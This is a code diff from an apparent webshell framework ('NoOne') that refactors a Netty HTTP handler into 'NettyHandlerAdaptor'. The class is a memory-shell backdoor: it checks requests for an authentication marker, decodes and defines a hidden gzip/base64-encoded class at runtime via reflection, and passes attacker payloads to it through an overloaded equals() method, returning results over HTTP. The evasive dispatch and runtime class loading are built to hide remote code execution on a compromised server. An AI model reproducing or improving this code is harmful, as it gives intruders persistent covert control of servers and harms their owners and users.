@@ -1,91 +1,77 @@
-package com.reajason.noone.core.shelltool;
+package com.reajason.noone.core.adaptor;
 
-
-import io.netty.buffer.CompositeByteBuf;
 import io.netty.buffer.Unpooled;
-import io.netty.channel.ChannelDuplexHandler;
 import io.netty.channel.ChannelFutureListener;
-import io.netty.channel.ChannelHandler;
 import io.netty.channel.ChannelHandlerContext;
 import io.netty.handler.codec.http.*;
-import io.netty.util.ReferenceCountUtil;
 
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
+import java.io.*;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.net.URL;
 import java.net.URLClassLoader;
-import java.util.Arrays;
 import java.util.zip.GZIPInputStream;
 
-@ChannelHandler.Sharable
-public class NoOneNettyHandler extends ChannelDuplexHandler {
+public class NettyHandlerAdaptor extends ClassLoader {
+    private static volatile Class<?> coreClass = null;
     private static String coreGzipBase64;
-    private boolean authed;
-    private Class<?> coreClass;
-    private CompositeByteBuf accumulated;
 
-    @Override
-    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
-        if (msg instanceof HttpRequest) {
-            authed = isAuthed((HttpRequest) msg);
-            if (!authed) {
-                ctx.fireChannelRead(msg);
-                return;
-            }
-        }
-        if (msg instanceof HttpContent) {
-            if (!authed) {
-                ctx.fireChannelRead(msg);
-                return;
-            }
-            HttpContent httpContent = (HttpContent) msg;
-            if (accumulated == null) {
-                accumulated = ctx.alloc().compositeBuffer();
-            }
-            accumulated.addComponent(true, httpContent.content().retain());
+    public NettyHandlerAdaptor() {
+    }
 
-            if (httpContent instanceof LastHttpContent) {
-                try {
-                    byte[] bytes = new byte[accumulated.readableBytes()];
-                    accumulated.getBytes(accumulated.readerIndex(), bytes);
-                    byte[] payload = transformReqPayload(getArgFromContent(bytes));
-                    if (coreClass == null) {
-                        byte[] coreBytes = gzipDecompress(decodeBase64(coreGzipBase64));
-                        coreClass = reflectionDefineClass(coreBytes);
-                    }
-                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
-                    Object httpChannelCore = coreClass.newInstance();
-                    httpChannelCore.equals(new Object[]{payload, outputStream});
-                    byte[] data = wrapResData(transformResData(outputStream.toByteArray()));
-                    FullHttpResponse response = new DefaultFullHttpResponse(
-                            HttpVersion.HTTP_1_1,
-                            HttpResponseStatus.OK,
-                            Unpooled.wrappedBuffer(data)
-                    );
-                    response.headers().set("Content-Type", "text/plain; charset=UTF-8");
-                    response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());
-                    wrapResponse(response);
-                    ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);
-                } catch (Throwable e) {
-                    e.printStackTrace();
-                }
-                return;
-            }
-            ctx.fireChannelRead(msg);
-        }
+    public NettyHandlerAdaptor(ClassLoader parent) {
+        super(parent);
     }
 
     @Override
-    public void channelInactive(ChannelHandlerContext ctx) throws Exception {
-        if (accumulated != null) {
-            accumulated.release();
-            accumulated = null;
-            authed = false;
+    public boolean equals(Object obj) {
+        Object[] args = (Object[]) obj;
+        if (args.length == 1) {
+            try {
+                return isAuthed((HttpRequest) args[0]);
+            } catch (Throwable e) {
+                return false;
+            }
         }
-        super.channelInactive(ctx);
+        ChannelHandlerContext ctx = (ChannelHandlerContext) args[0];
+        HttpRequest request = (HttpRequest) args[1];
+        byte[] content = (byte[]) args[2];
+        try {
+            if (isAuthed(request)) {
+                try {
+                    byte[] payload = transformReqPayload(getArgFromContent(content));
+                    if (coreClass == null) {
+                        synchronized (NettyHandlerAdaptor.class) {
+                            if (coreClass == null) {
+                                byte[] coreBytes = gzipDecompress(decodeBase64(coreGzipBase64));
+                                coreClass = reflectionDefineClass(coreBytes);
+                            }
+                        }
+                    }
+                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+                    FullHttpResponse response = new DefaultFullHttpResponse(
+                            HttpVersion.HTTP_1_1,
+                            HttpResponseStatus.OK,
+                            Unpooled.buffer(0)
+                    );
+                    Object httpChannelCore = coreClass.newInstance();
+                    httpChannelCore.equals(new Object[]{request, response});
+                    httpChannelCore.equals(new Object[]{payload, outputStream});
+                    writeResponse(ctx, response, wrapResData(transformResData(outputStream.toByteArray())));
+                } catch (Throwable e) {
+                    FullHttpResponse response = new DefaultFullHttpResponse(
+                            HttpVersion.HTTP_1_1,
+                            HttpResponseStatus.OK,
+                            Unpooled.buffer(0)
+                    );
+                    writeResponse(ctx, response, getStackTraceAsString(e).getBytes("UTF-8"));
+                }
+                return true;
+            }
+        } catch (Throwable e) {
+            return false;
+        }
+        return false;
     }
 
     private boolean isAuthed(HttpRequest request) {
@@ -109,6 +95,16 @@ public class NoOneNettyHandler extends ChannelDuplexHandler {
     }
 
     private void wrapResponse(FullHttpResponse response) {
+    }
+
+    private void writeResponse(ChannelHandlerContext ctx, FullHttpResponse response, byte[] data) {
+        response.content().writeBytes(data);
+        if (!response.headers().contains(HttpHeaderNames.CONTENT_TYPE)) {
+            response.headers().set(HttpHeaderNames.CONTENT_TYPE, "text/plain; charset=UTF-8");
+        }
+        response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());
+        wrapResponse(response);
+        ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);
     }
 
     @SuppressWarnings("all")
@@ -171,5 +167,12 @@ public class NoOneNettyHandler extends ChannelDuplexHandler {
             }
             out.close();
         }
+    }
+
+    private String getStackTraceAsString(Throwable throwable) {
+        StringWriter sw = new StringWriter();
+        PrintWriter pw = new PrintWriter(sw);
+        throwable.printStackTrace(pw);
+        return sw.toString();
     }
 }
